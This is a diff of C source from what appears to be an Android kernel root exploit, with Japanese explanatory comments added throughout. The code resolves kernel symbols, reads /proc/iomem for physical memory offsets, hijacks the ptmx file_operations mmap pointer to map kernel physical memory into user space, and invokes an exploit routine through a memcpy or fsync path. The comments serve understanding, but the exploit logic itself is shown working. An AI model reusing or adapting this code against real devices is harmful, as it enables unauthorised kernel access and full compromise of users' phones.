@@ -28,17 +28,19 @@ setup_remap_pfn_range_address(void)
   remap_pfn_range = (void *)device_get_symbol_address(DEVICE_SYMBOL(remap_pfn_range));
 
   if (!remap_pfn_range && kallsyms_exist()) {
-    remap_pfn_range = kallsyms_get_symbol_address("remap_pfn_range");
+    remap_pfn_range = kallsyms_get_symbol_address("remap_pfn_range"); //kallsymsからremap_pfn_rangeのシンボル情報を取得
   }
 
   return !!remap_pfn_range;
 }
 
+/* カーネルの物理メモリ上のオフセットの設定処理ここから */
 void
 set_kernel_phys_offset(unsigned long int offset)
 {
   kernel_phys_offset = offset;
 }
+/* カーネルの物理メモリ上のオフセットの特定処理ここまで */
 
 #define PAGE_SHIFT  12
 
@@ -54,6 +56,7 @@ convert_to_mmaped_address(void *address, void *mmap_base_address)
   return mmap_base_address + (address - (void*)PAGE_OFFSET);
 }
 
+/* カーネルの物理メモリのパラメータを調べるここから */
 static bool
 detect_kernel_phys_parameters(void)
 {
@@ -65,9 +68,9 @@ detect_kernel_phys_parameters(void)
 
   system_ram_address = NULL;
 
-  fp = fopen("/proc/iomem", "r");
+  fp = fopen("/proc/iomem", "r"); // "/proc/iomem"のファイルポインタを取得
   if (!fp) {
-    printf("Failed to open /proc/iomem due to %s.\n", strerror(errno));
+    printf("Failed to open /proc/iomem due to %s.\n", strerror(errno)); // "/proc/iomem"のファイルポインタの取得に失敗
     return false;
   }
 
@@ -86,6 +89,7 @@ detect_kernel_phys_parameters(void)
 
   return true;
 }
+/* カーネルの物理メモリのパラメータを調べるここまで */
 
 static void *old_mmap_handler;
 
@@ -100,7 +104,7 @@ ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
   ret = remap_pfn_range(vma, vma->vm_start,
                             kernel_phys_offset >> PAGE_SHIFT,
                             vma->vm_end - vma->vm_start, vma->vm_page_prot);
-
+//kernel_phys_offsetからPAGE_SHIFT分右シフト
   if (p) {
     *p = old_mmap_handler;
   }
@@ -111,11 +115,11 @@ ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
 static void
 setup_mmap_by_fsync(void)
 {
-  void **p;
+  void **p; //ポインタのポインタ
 
   p = (void **)ptmx_fops_mmap_address;
   if (p) {
-    old_mmap_handler = *p;
+    old_mmap_handler = *p; //ポインタpのメモリアドレスをold_mmap_handlerに代入
     *p = (void *)&ptmx_mmap;
   }
 }
@@ -136,7 +140,7 @@ run_callback_with_fsync_and_mmap(void *user_data)
                  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                  fd, 0);
   if (address == MAP_FAILED) {
-    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
+    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno)); // "/dev/ptmx"のmmapに失敗
     close(fd);
     return false;
   }
@@ -193,36 +197,37 @@ run_with_mmap(memory_callback_t callback)
   setup_remap_pfn_range_address();
 
   if (!remap_pfn_range) {
-    printf("You need to manage to get remap_pfn_range address.\n");
+    printf("You need to manage to get remap_pfn_range address.\n"); //remap_pfn_rangeのアドレス取得に失敗
     return false;
   }
 
   setup_ptmx_fops_fsync_address();
   if (!ptmx_fops_fsync_address) {
-    printf("You need to manage to get ptmx_fops address.\n");
+    printf("You need to manage to get ptmx_fops address.\n"); //ptmx_fops_fsyncのアドレス取得に失敗
     return false;
   }
 
   setup_ptmx_fops_mmap_address();
   if (!ptmx_fops_mmap_address) {
-    printf("You need to manage to get ptmx_fops address.\n");
+    printf("You need to manage to get ptmx_fops address.\n"); //ptmx_fops_mmapのアドレス取得に失敗
     return false;
   }
 
   kernel_physical_offset = device_get_symbol_address(DEVICE_SYMBOL(kernel_physical_offset));
   if (kernel_physical_offset) {
-    set_kernel_phys_offset(kernel_physical_offset - 0x00008000);
+    set_kernel_phys_offset(kernel_physical_offset - 0x00008000); // 0x00008000 = boot.imgのメモリアドレス
   }
   else if (!detect_kernel_phys_parameters()) {
-    printf("You need to manage to get kernel_physical_offset address.\n");
+    printf("You need to manage to get kernel_physical_offset address.\n"); //カーネルの物理メモリ上のオフセットアドレスの取得に失敗
     return false;
   }
 
   return attempt_exploit(ptmx_fops_fsync_address,
                          (unsigned long int)&setup_mmap_by_fsync, 0,
-                         run_callback_with_fsync_and_mmap, callback);
+                         run_callback_with_fsync_and_mmap, callback); //exploitの試行
 }
 
+/* memcpy_exploit exploitを実行ここから */
 static bool
 run_exploit_memcpy(memory_callback_t callback, bool *result)
 {
@@ -237,6 +242,7 @@ run_exploit_memcpy(memory_callback_t callback, bool *result)
 
   return false;
 }
+/* memcpy_exploit exploitを実行ここまで */
 
 bool
 run_with_memcpy(memory_callback_t callback)
